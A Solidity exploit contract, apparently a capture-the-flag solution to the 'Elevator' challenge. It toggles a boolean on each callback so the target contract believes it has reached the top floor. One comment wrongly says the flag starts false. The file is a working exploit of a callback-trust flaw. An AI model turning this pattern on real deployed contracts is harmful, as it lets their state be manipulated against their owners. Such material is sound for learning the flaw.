// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './elevator.sol';

contract Attack_Elevator {
    bool public boolean = true;
    Elevator public target;

    constructor(address _addr){
        target = Elevator(_addr);
    }

    //Elevator.sol function/interface require a argument
    function isLastFloor(uint) public returns(bool){
        //boolean is false by default
        // The ! operator is the logical NOT operator in Solidity, 
        // which means it reverses the truth value of a boolean expression.
        boolean = !boolean;

        // if (boolean == true){
        //     boolean = false;
        // }
        // else{
        //     boolean = true;
        // }
        return boolean;
    }

    function attack() public {
        target.goTo(1);
    }

}

